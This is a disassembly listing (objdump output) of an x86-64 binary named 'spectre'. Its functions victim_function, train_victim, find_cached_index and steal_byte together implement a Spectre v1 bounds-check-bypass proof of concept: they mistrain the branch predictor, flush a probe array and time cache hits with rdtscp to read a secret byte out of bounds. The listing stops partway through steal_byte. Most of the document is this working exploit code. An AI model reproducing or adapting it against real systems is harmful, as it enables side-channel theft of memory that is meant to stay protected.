
spectre:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x2d3>
 248:	78 38                	js     282 <_init-0x2c6>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 bd 5a 40 fd d1    	add    %bh,-0x2e02bfa6(%rbp)
 289:	24 11                	and    $0x11,%al
 28b:	e0 d6                	loopne 263 <_init-0x2e5>
 28d:	c9                   	leaveq 
 28e:	f2 9b                	repnz fwait
 290:	89 e8                	mov    %ebp,%eax
 292:	6a e5                	pushq  $0xffffffffffffffe5
 294:	0a                   	.byte 0xa
 295:	8c 7f 69             	mov    %?,0x69(%rdi)

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	5a                   	pop    %rdx
 2d1:	00 00                	add    %al,(%rax)
 2d3:	00 20                	add    %ah,(%rax)
	...
 2e5:	00 00                	add    %al,(%rax)
 2e7:	00 0b                	add    %cl,(%rbx)
 2e9:	00 00                	add    %al,(%rax)
 2eb:	00 12                	add    %dl,(%rdx)
	...
 2fd:	00 00                	add    %al,(%rax)
 2ff:	00 1c 00             	add    %bl,(%rax,%rax,1)
 302:	00 00                	add    %al,(%rax)
 304:	12 00                	adc    (%rax),%al
	...
 316:	00 00                	add    %al,(%rax)
 318:	32 00                	xor    (%rax),%al
 31a:	00 00                	add    %al,(%rax)
 31c:	12 00                	adc    (%rax),%al
	...
 32e:	00 00                	add    %al,(%rax)
 330:	76 00                	jbe    332 <_init-0x216>
 332:	00 00                	add    %al,(%rax)
 334:	20 00                	and    %al,(%rax)
	...
 346:	00 00                	add    %al,(%rax)
 348:	85 00                	test   %eax,(%rax)
 34a:	00 00                	add    %al,(%rax)
 34c:	20 00                	and    %al,(%rax)
	...
 35e:	00 00                	add    %al,(%rax)
 360:	23 00                	and    (%rax),%eax
 362:	00 00                	add    %al,(%rax)
 364:	22 00                	and    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000000378 <.dynstr>:
 378:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 37c:	63 2e                	movslq (%rsi),%ebp
 37e:	73 6f                	jae    3ef <_init-0x159>
 380:	2e 36 00 5f 5f       	cs add %bl,%ss:0x5f(%rdi)
 385:	73 74                	jae    3fb <_init-0x14d>
 387:	61                   	(bad)  
 388:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
 38b:	63 68 6b             	movslq 0x6b(%rax),%ebp
 38e:	5f                   	pop    %rdi
 38f:	66 61                	data16 (bad) 
 391:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%rax,%rax,1),%ebp
 398:	74 
 399:	66 00 5f 5f          	data16 add %bl,0x5f(%rdi)
 39d:	63 78 61             	movslq 0x61(%rax),%edi
 3a0:	5f                   	pop    %rdi
 3a1:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 3a7:	7a 65                	jp     40e <_init-0x13a>
 3a9:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3ac:	6c                   	insb   (%dx),%es:(%rdi)
 3ad:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 3b4:	72 74                	jb     42a <_init-0x11e>
 3b6:	5f                   	pop    %rdi
 3b7:	6d                   	insl   (%dx),%es:(%rdi)
 3b8:	61                   	(bad)  
 3b9:	69 6e 00 47 4c 49 42 	imul   $0x42494c47,0x0(%rsi),%ebp
 3c0:	43 5f                	rex.XB pop %r15
 3c2:	32 2e                	xor    (%rsi),%ch
 3c4:	32 2e                	xor    (%rsi),%ch
 3c6:	35 00 47 4c 49       	xor    $0x494c4700,%eax
 3cb:	42                   	rex.X
 3cc:	43 5f                	rex.XB pop %r15
 3ce:	32 2e                	xor    (%rsi),%ch
 3d0:	34 00                	xor    $0x0,%al
 3d2:	5f                   	pop    %rdi
 3d3:	49 54                	rex.WB push %r12
 3d5:	4d 5f                	rex.WRB pop %r15
 3d7:	64 65 72 65          	fs gs jb 440 <_init-0x108>
 3db:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 3e2:	4d 
 3e3:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 3e5:	6f                   	outsl  %ds:(%rsi),(%dx)
 3e6:	6e                   	outsb  %ds:(%rsi),(%dx)
 3e7:	65 54                	gs push %rsp
 3e9:	61                   	(bad)  
 3ea:	62                   	(bad)  
 3eb:	6c                   	insb   (%dx),%es:(%rdi)
 3ec:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 3f0:	67 6d                	insl   (%dx),%es:(%edi)
 3f2:	6f                   	outsl  %ds:(%rsi),(%dx)
 3f3:	6e                   	outsb  %ds:(%rsi),(%dx)
 3f4:	5f                   	pop    %rdi
 3f5:	73 74                	jae    46b <_init-0xdd>
 3f7:	61                   	(bad)  
 3f8:	72 74                	jb     46e <_init-0xda>
 3fa:	5f                   	pop    %rdi
 3fb:	5f                   	pop    %rdi
 3fc:	00 5f 49             	add    %bl,0x49(%rdi)
 3ff:	54                   	push   %rsp
 400:	4d 5f                	rex.WRB pop %r15
 402:	72 65                	jb     469 <_init-0xdf>
 404:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 40b:	4d 
 40c:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 40e:	6f                   	outsl  %ds:(%rsi),(%dx)
 40f:	6e                   	outsb  %ds:(%rsi),(%dx)
 410:	65 54                	gs push %rsp
 412:	61                   	(bad)  
 413:	62                   	.byte 0x62
 414:	6c                   	insb   (%dx),%es:(%rdi)
 415:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000418 <.gnu.version>:
 418:	00 00                	add    %al,(%rax)
 41a:	00 00                	add    %al,(%rax)
 41c:	02 00                	add    (%rax),%al
 41e:	03 00                	add    (%rax),%eax
 420:	03 00                	add    (%rax),%eax
 422:	00 00                	add    %al,(%rax)
 424:	00 00                	add    %al,(%rax)
 426:	03 00                	add    (%rax),%eax

Disassembly of section .gnu.version_r:

0000000000000428 <.gnu.version_r>:
 428:	01 00                	add    %eax,(%rax)
 42a:	02 00                	add    (%rax),%al
 42c:	01 00                	add    %eax,(%rax)
 42e:	00 00                	add    %al,(%rax)
 430:	10 00                	adc    %al,(%rax)
 432:	00 00                	add    %al,(%rax)
 434:	00 00                	add    %al,(%rax)
 436:	00 00                	add    %al,(%rax)
 438:	75 1a                	jne    454 <_init-0xf4>
 43a:	69 09 00 00 03 00    	imul   $0x30000,(%rcx),%ecx
 440:	44 00 00             	add    %r8b,(%rax)
 443:	00 10                	add    %dl,(%rax)
 445:	00 00                	add    %al,(%rax)
 447:	00 14 69             	add    %dl,(%rcx,%rbp,2)
 44a:	69 0d 00 00 02 00 50 	imul   $0x50,0x20000(%rip),%ecx        # 20454 <__FRAME_END__+0x1f750>
 451:	00 00 00 
 454:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000458 <.rela.dyn>:
 458:	b0 0d                	mov    $0xd,%al
 45a:	20 00                	and    %al,(%rax)
 45c:	00 00                	add    %al,(%rax)
 45e:	00 00                	add    %al,(%rax)
 460:	08 00                	or     %al,(%rax)
 462:	00 00                	add    %al,(%rax)
 464:	00 00                	add    %al,(%rax)
 466:	00 00                	add    %al,(%rax)
 468:	a0 06 00 00 00 00 00 	movabs 0xb800000000000006,%al
 46f:	00 b8 
 471:	0d 20 00 00 00       	or     $0x20,%eax
 476:	00 00                	add    %al,(%rax)
 478:	08 00                	or     %al,(%rax)
 47a:	00 00                	add    %al,(%rax)
 47c:	00 00                	add    %al,(%rax)
 47e:	00 00                	add    %al,(%rax)
 480:	60                   	(bad)  
 481:	06                   	(bad)  
 482:	00 00                	add    %al,(%rax)
 484:	00 00                	add    %al,(%rax)
 486:	00 00                	add    %al,(%rax)
 488:	08 10                	or     %dl,(%rax)
 48a:	20 00                	and    %al,(%rax)
 48c:	00 00                	add    %al,(%rax)
 48e:	00 00                	add    %al,(%rax)
 490:	08 00                	or     %al,(%rax)
 492:	00 00                	add    %al,(%rax)
 494:	00 00                	add    %al,(%rax)
 496:	00 00                	add    %al,(%rax)
 498:	08 10                	or     %dl,(%rax)
 49a:	20 00                	and    %al,(%rax)
 49c:	00 00                	add    %al,(%rax)
 49e:	00 00                	add    %al,(%rax)
 4a0:	d8 0f                	fmuls  (%rdi)
 4a2:	20 00                	and    %al,(%rax)
 4a4:	00 00                	add    %al,(%rax)
 4a6:	00 00                	add    %al,(%rax)
 4a8:	06                   	(bad)  
 4a9:	00 00                	add    %al,(%rax)
 4ab:	00 01                	add    %al,(%rcx)
	...
 4b5:	00 00                	add    %al,(%rax)
 4b7:	00 e0                	add    %ah,%al
 4b9:	0f 20 00             	mov    %cr0,%rax
 4bc:	00 00                	add    %al,(%rax)
 4be:	00 00                	add    %al,(%rax)
 4c0:	06                   	(bad)  
 4c1:	00 00                	add    %al,(%rax)
 4c3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 4ce:	00 00                	add    %al,(%rax)
 4d0:	e8 0f 20 00 00       	callq  24e4 <__FRAME_END__+0x17e0>
 4d5:	00 00                	add    %al,(%rax)
 4d7:	00 06                	add    %al,(%rsi)
 4d9:	00 00                	add    %al,(%rax)
 4db:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 4e1 <_init-0x67>
 4e1:	00 00                	add    %al,(%rax)
 4e3:	00 00                	add    %al,(%rax)
 4e5:	00 00                	add    %al,(%rax)
 4e7:	00 f0                	add    %dh,%al
 4e9:	0f 20 00             	mov    %cr0,%rax
 4ec:	00 00                	add    %al,(%rax)
 4ee:	00 00                	add    %al,(%rax)
 4f0:	06                   	(bad)  
 4f1:	00 00                	add    %al,(%rax)
 4f3:	00 06                	add    %al,(%rsi)
	...
 4fd:	00 00                	add    %al,(%rax)
 4ff:	00 f8                	add    %bh,%al
 501:	0f 20 00             	mov    %cr0,%rax
 504:	00 00                	add    %al,(%rax)
 506:	00 00                	add    %al,(%rax)
 508:	06                   	(bad)  
 509:	00 00                	add    %al,(%rax)
 50b:	00 07                	add    %al,(%rdi)
	...

Disassembly of section .rela.plt:

0000000000000518 <.rela.plt>:
 518:	c8 0f 20 00          	enterq $0x200f,$0x0
 51c:	00 00                	add    %al,(%rax)
 51e:	00 00                	add    %al,(%rax)
 520:	07                   	(bad)  
 521:	00 00                	add    %al,(%rax)
 523:	00 02                	add    %al,(%rdx)
	...
 52d:	00 00                	add    %al,(%rax)
 52f:	00 d0                	add    %dl,%al
 531:	0f 20 00             	mov    %cr0,%rax
 534:	00 00                	add    %al,(%rax)
 536:	00 00                	add    %al,(%rax)
 538:	07                   	(bad)  
 539:	00 00                	add    %al,(%rax)
 53b:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .init:

0000000000000548 <_init>:
 548:	48 83 ec 08          	sub    $0x8,%rsp
 54c:	48 8b 05 95 0a 20 00 	mov    0x200a95(%rip),%rax        # 200fe8 <__gmon_start__>
 553:	48 85 c0             	test   %rax,%rax
 556:	74 02                	je     55a <_init+0x12>
 558:	ff d0                	callq  *%rax
 55a:	48 83 c4 08          	add    $0x8,%rsp
 55e:	c3                   	retq   

Disassembly of section .plt:

0000000000000560 <.plt>:
 560:	ff 35 52 0a 20 00    	pushq  0x200a52(%rip)        # 200fb8 <_GLOBAL_OFFSET_TABLE_+0x8>
 566:	ff 25 54 0a 20 00    	jmpq   *0x200a54(%rip)        # 200fc0 <_GLOBAL_OFFSET_TABLE_+0x10>
 56c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000570 <__stack_chk_fail@plt>:
 570:	ff 25 52 0a 20 00    	jmpq   *0x200a52(%rip)        # 200fc8 <__stack_chk_fail@GLIBC_2.4>
 576:	68 00 00 00 00       	pushq  $0x0
 57b:	e9 e0 ff ff ff       	jmpq   560 <.plt>

0000000000000580 <printf@plt>:
 580:	ff 25 4a 0a 20 00    	jmpq   *0x200a4a(%rip)        # 200fd0 <printf@GLIBC_2.2.5>
 586:	68 01 00 00 00       	pushq  $0x1
 58b:	e9 d0 ff ff ff       	jmpq   560 <.plt>

Disassembly of section .plt.got:

0000000000000590 <__cxa_finalize@plt>:
 590:	ff 25 62 0a 20 00    	jmpq   *0x200a62(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 596:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000005a0 <_start>:
 5a0:	31 ed                	xor    %ebp,%ebp
 5a2:	49 89 d1             	mov    %rdx,%r9
 5a5:	5e                   	pop    %rsi
 5a6:	48 89 e2             	mov    %rsp,%rdx
 5a9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 5ad:	50                   	push   %rax
 5ae:	54                   	push   %rsp
 5af:	4c 8d 05 fa 04 00 00 	lea    0x4fa(%rip),%r8        # ab0 <__libc_csu_fini>
 5b6:	48 8d 0d 83 04 00 00 	lea    0x483(%rip),%rcx        # a40 <__libc_csu_init>
 5bd:	48 8d 3d 15 04 00 00 	lea    0x415(%rip),%rdi        # 9d9 <main>
 5c4:	ff 15 16 0a 20 00    	callq  *0x200a16(%rip)        # 200fe0 <__libc_start_main@GLIBC_2.2.5>
 5ca:	f4                   	hlt    
 5cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000005d0 <deregister_tm_clones>:
 5d0:	48 8d 3d 91 0a 20 00 	lea    0x200a91(%rip),%rdi        # 201068 <__TMC_END__>
 5d7:	55                   	push   %rbp
 5d8:	48 8d 05 89 0a 20 00 	lea    0x200a89(%rip),%rax        # 201068 <__TMC_END__>
 5df:	48 39 f8             	cmp    %rdi,%rax
 5e2:	48 89 e5             	mov    %rsp,%rbp
 5e5:	74 19                	je     600 <deregister_tm_clones+0x30>
 5e7:	48 8b 05 ea 09 20 00 	mov    0x2009ea(%rip),%rax        # 200fd8 <_ITM_deregisterTMCloneTable>
 5ee:	48 85 c0             	test   %rax,%rax
 5f1:	74 0d                	je     600 <deregister_tm_clones+0x30>
 5f3:	5d                   	pop    %rbp
 5f4:	ff e0                	jmpq   *%rax
 5f6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 5fd:	00 00 00 
 600:	5d                   	pop    %rbp
 601:	c3                   	retq   
 602:	0f 1f 40 00          	nopl   0x0(%rax)
 606:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 60d:	00 00 00 

0000000000000610 <register_tm_clones>:
 610:	48 8d 3d 51 0a 20 00 	lea    0x200a51(%rip),%rdi        # 201068 <__TMC_END__>
 617:	48 8d 35 4a 0a 20 00 	lea    0x200a4a(%rip),%rsi        # 201068 <__TMC_END__>
 61e:	55                   	push   %rbp
 61f:	48 29 fe             	sub    %rdi,%rsi
 622:	48 89 e5             	mov    %rsp,%rbp
 625:	48 c1 fe 03          	sar    $0x3,%rsi
 629:	48 89 f0             	mov    %rsi,%rax
 62c:	48 c1 e8 3f          	shr    $0x3f,%rax
 630:	48 01 c6             	add    %rax,%rsi
 633:	48 d1 fe             	sar    %rsi
 636:	74 18                	je     650 <register_tm_clones+0x40>
 638:	48 8b 05 b1 09 20 00 	mov    0x2009b1(%rip),%rax        # 200ff0 <_ITM_registerTMCloneTable>
 63f:	48 85 c0             	test   %rax,%rax
 642:	74 0c                	je     650 <register_tm_clones+0x40>
 644:	5d                   	pop    %rbp
 645:	ff e0                	jmpq   *%rax
 647:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 64e:	00 00 
 650:	5d                   	pop    %rbp
 651:	c3                   	retq   
 652:	0f 1f 40 00          	nopl   0x0(%rax)
 656:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 65d:	00 00 00 

0000000000000660 <__do_global_dtors_aux>:
 660:	80 3d 19 0a 20 00 00 	cmpb   $0x0,0x200a19(%rip)        # 201080 <completed.7697>
 667:	75 2f                	jne    698 <__do_global_dtors_aux+0x38>
 669:	48 83 3d 87 09 20 00 	cmpq   $0x0,0x200987(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 670:	00 
 671:	55                   	push   %rbp
 672:	48 89 e5             	mov    %rsp,%rbp
 675:	74 0c                	je     683 <__do_global_dtors_aux+0x23>
 677:	48 8b 3d 8a 09 20 00 	mov    0x20098a(%rip),%rdi        # 201008 <__dso_handle>
 67e:	e8 0d ff ff ff       	callq  590 <__cxa_finalize@plt>
 683:	e8 48 ff ff ff       	callq  5d0 <deregister_tm_clones>
 688:	c6 05 f1 09 20 00 01 	movb   $0x1,0x2009f1(%rip)        # 201080 <completed.7697>
 68f:	5d                   	pop    %rbp
 690:	c3                   	retq   
 691:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 698:	f3 c3                	repz retq 
 69a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000006a0 <frame_dummy>:
 6a0:	55                   	push   %rbp
 6a1:	48 89 e5             	mov    %rsp,%rbp
 6a4:	5d                   	pop    %rbp
 6a5:	e9 66 ff ff ff       	jmpq   610 <register_tm_clones>

00000000000006aa <victim_function>:
 6aa:	55                   	push   %rbp
 6ab:	48 89 e5             	mov    %rsp,%rbp
 6ae:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 6b2:	8b 05 68 09 20 00    	mov    0x200968(%rip),%eax        # 201020 <bufferSize>
 6b8:	48 98                	cltq   
 6ba:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 6be:	73 34                	jae    6f4 <victim_function+0x4a>
 6c0:	48 8d 15 61 09 20 00 	lea    0x200961(%rip),%rdx        # 201028 <buffer>
 6c7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 6cb:	48 01 d0             	add    %rdx,%rax
 6ce:	0f b6 00             	movzbl (%rax),%eax
 6d1:	0f b6 c0             	movzbl %al,%eax
 6d4:	c1 e0 0c             	shl    $0xc,%eax
 6d7:	48 63 d0             	movslq %eax,%rdx
 6da:	48 8d 05 bf 09 20 00 	lea    0x2009bf(%rip),%rax        # 2010a0 <array>
 6e1:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 6e5:	0f b6 05 95 09 20 00 	movzbl 0x200995(%rip),%eax        # 201081 <temp>
 6ec:	21 d0                	and    %edx,%eax
 6ee:	88 05 8d 09 20 00    	mov    %al,0x20098d(%rip)        # 201081 <temp>
 6f4:	90                   	nop
 6f5:	5d                   	pop    %rbp
 6f6:	c3                   	retq   

00000000000006f7 <find_cached_index>:
 6f7:	55                   	push   %rbp
 6f8:	48 89 e5             	mov    %rsp,%rbp
 6fb:	53                   	push   %rbx
 6fc:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 700:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 707:	eb 5a                	jmp    763 <find_cached_index+0x6c>
 709:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 710:	00 
 711:	8b 45 ec             	mov    -0x14(%rbp),%eax
 714:	c1 e0 0c             	shl    $0xc,%eax
 717:	48 63 d0             	movslq %eax,%rdx
 71a:	48 8d 05 7f 09 20 00 	lea    0x20097f(%rip),%rax        # 2010a0 <array>
 721:	48 01 d0             	add    %rdx,%rax
 724:	48 89 c3             	mov    %rax,%rbx
 727:	0f ae f0             	mfence 
 72a:	0f 01 f9             	rdtscp 
 72d:	49 89 c2             	mov    %rax,%r10
 730:	48 8b 0b             	mov    (%rbx),%rcx
 733:	0f 01 f9             	rdtscp 
 736:	4c 29 d0             	sub    %r10,%rax
 739:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 73d:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 742:	77 1b                	ja     75f <find_cached_index+0x68>
 744:	8b 45 ec             	mov    -0x14(%rbp),%eax
 747:	48 98                	cltq   
 749:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 750:	00 
 751:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 755:	48 01 d0             	add    %rdx,%rax
 758:	8b 10                	mov    (%rax),%edx
 75a:	83 c2 01             	add    $0x1,%edx
 75d:	89 10                	mov    %edx,(%rax)
 75f:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 763:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 76a:	7e 9d                	jle    709 <find_cached_index+0x12>
 76c:	90                   	nop
 76d:	5b                   	pop    %rbx
 76e:	5d                   	pop    %rbp
 76f:	c3                   	retq   

0000000000000770 <train_victim>:
 770:	55                   	push   %rbp
 771:	48 89 e5             	mov    %rsp,%rbp
 774:	48 83 ec 10          	sub    $0x10,%rsp
 778:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 77f:	eb 6b                	jmp    7ec <train_victim+0x7c>
 781:	48 8d 05 98 08 20 00 	lea    0x200898(%rip),%rax        # 201020 <bufferSize>
 788:	0f ae 38             	clflush (%rax)
 78b:	8b 4d f8             	mov    -0x8(%rbp),%ecx
 78e:	ba 67 66 66 66       	mov    $0x66666667,%edx
 793:	89 c8                	mov    %ecx,%eax
 795:	f7 ea                	imul   %edx
 797:	c1 fa 02             	sar    $0x2,%edx
 79a:	89 c8                	mov    %ecx,%eax
 79c:	c1 f8 1f             	sar    $0x1f,%eax
 79f:	29 c2                	sub    %eax,%edx
 7a1:	89 d0                	mov    %edx,%eax
 7a3:	c1 e0 02             	shl    $0x2,%eax
 7a6:	01 d0                	add    %edx,%eax
 7a8:	01 c0                	add    %eax,%eax
 7aa:	29 c1                	sub    %eax,%ecx
 7ac:	89 ca                	mov    %ecx,%edx
 7ae:	48 63 c2             	movslq %edx,%rax
 7b1:	48 89 c7             	mov    %rax,%rdi
 7b4:	e8 f1 fe ff ff       	callq  6aa <victim_function>
 7b9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 7c0:	eb 1a                	jmp    7dc <train_victim+0x6c>
 7c2:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7c5:	c1 e0 0c             	shl    $0xc,%eax
 7c8:	48 63 d0             	movslq %eax,%rdx
 7cb:	48 8d 05 ce 08 20 00 	lea    0x2008ce(%rip),%rax        # 2010a0 <array>
 7d2:	48 01 d0             	add    %rdx,%rax
 7d5:	0f ae 38             	clflush (%rax)
 7d8:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 7dc:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 7e3:	7e dd                	jle    7c2 <train_victim+0x52>
 7e5:	0f ae f0             	mfence 
 7e8:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 7ec:	83 7d f8 13          	cmpl   $0x13,-0x8(%rbp)
 7f0:	7e 8f                	jle    781 <train_victim+0x11>
 7f2:	90                   	nop
 7f3:	c9                   	leaveq 
 7f4:	c3                   	retq   

00000000000007f5 <find_highest_score>:
 7f5:	55                   	push   %rbp
 7f6:	48 89 e5             	mov    %rsp,%rbp
 7f9:	48 83 ec 20          	sub    $0x20,%rsp
 7fd:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 801:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 808:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 80f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 816:	eb 3e                	jmp    856 <find_highest_score+0x61>
 818:	8b 45 fc             	mov    -0x4(%rbp),%eax
 81b:	48 98                	cltq   
 81d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 824:	00 
 825:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 829:	48 01 d0             	add    %rdx,%rax
 82c:	8b 00                	mov    (%rax),%eax
 82e:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 831:	7d 1f                	jge    852 <find_highest_score+0x5d>
 833:	8b 45 fc             	mov    -0x4(%rbp),%eax
 836:	89 45 f8             	mov    %eax,-0x8(%rbp)
 839:	8b 45 fc             	mov    -0x4(%rbp),%eax
 83c:	48 98                	cltq   
 83e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 845:	00 
 846:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 84a:	48 01 d0             	add    %rdx,%rax
 84d:	8b 00                	mov    (%rax),%eax
 84f:	89 45 f4             	mov    %eax,-0xc(%rbp)
 852:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 856:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 85d:	7e b9                	jle    818 <find_highest_score+0x23>
 85f:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 862:	8b 55 f8             	mov    -0x8(%rbp),%edx
 865:	8b 45 f8             	mov    -0x8(%rbp),%eax
 868:	89 c6                	mov    %eax,%esi
 86a:	48 8d 3d 57 02 00 00 	lea    0x257(%rip),%rdi        # ac8 <_IO_stdin_used+0x8>
 871:	b8 00 00 00 00       	mov    $0x0,%eax
 876:	e8 05 fd ff ff       	callq  580 <printf@plt>
 87b:	90                   	nop
 87c:	c9                   	leaveq 
 87d:	c3                   	retq   

000000000000087e <steal_byte>:
 87e:	55                   	push   %rbp
 87f:	48 89 e5             	mov    %rsp,%rbp
 882:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
 889:	89 bd cc fb ff ff    	mov    %edi,-0x434(%rbp)
 88f:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 896:	00 00 
 898:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 89c:	31 c0                	xor    %eax,%eax
 89e:	c7 85 d8 fb ff ff 00 	movl   $0x0,-0x428(%rbp)
 8a5:	00 00 00 
 8a8:	eb 20                	jmp    8ca <steal_byte+0x4c>
 8aa:	8b 85 d8 fb ff ff    	mov    -0x428(%rbp),%eax
 8b0:	c1 e0 0c             	shl    $0xc,%eax
 8b3:	48 63 d0             	movslq %eax,%rdx
 8b6:	48 8d 05 e3 07 20 00 	lea    0x2007e3(%rip),%rax        # 2010a0 <array>
 8bd:	48 01 d0             	add    %rdx,%rax
 8c0:	0f ae 38             	clflush (%rax)
 8c3:	83 85 d8 fb ff ff 01 	addl   $0x1,-0x428(%rbp)
 8ca:	81 bd d8 fb ff ff ff 	cmpl   $0xff,-0x428(%rbp)
 8d1:	00 00 00 
 8d4:	7e d4                	jle    8aa <steal_byte+0x2c>
 8d6:	0f ae f0             	mfence 
 8d9:	8b 85 cc fb ff ff    	mov    -0x434(%rbp),%eax
 8df:	48 98                	cltq   
 8e1:	48 8d 0d 58 07 20 00 	lea    0x200758(%rip),%rcx        # 201040 <secret>
 8e8:	48 8d 15 39 07 20 00 	lea    0x200739(%rip),%rdx        # 201028 <buffer>
 8ef:	48 29 d1             	sub    %rdx,%rcx
 8f2:	48 89 ca             	mov    %rcx,%rdx
 8f5:	48 01 d0             	add    %rdx,%rax
 8f8:	48 89 85 e8 fb ff ff 	mov    %rax,-0x418(%rbp)
 8ff:	c7 85 dc fb ff ff 00 	movl   $0x0,-0x424(%rbp)
 906:	00 00 00 
 909:	eb 1a                	jmp    925 <steal_byte+0xa7>
 90b:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
 911:	48 98                	cltq   
 913:	c7 84 85 f0 fb ff ff 	movl   $0x0,-0x410(%rbp,%rax,4)
 91a:	00 00 00 00 
 91e:	83 85 dc fb ff ff 01 	addl   $0x1,-0x424(%rbp)
 925:	81 bd dc fb ff ff ff 	cmpl   $0xff,-0x424(%rbp)
 92c:	00 00 00 
 92f:	7e da                	jle    90b <steal_byte+0x8d>
 931:	c7 85 e0 fb ff ff 00 	movl   $0x0,-0x420(%rbp)
 938:	00 00 00 
 93b:	eb 6a                	jmp    9a7 <steal_byte+0x129>
 93d:	b8 00 00 00 00       	mov    $0x0,%eax
 942:	e8 29 fe ff ff       	callq  770 <train_victim>
 947:	c7 85 e4 fb ff ff 00 	movl   $0x0,-0x41c(%rbp)
 94e:	00 00 00 
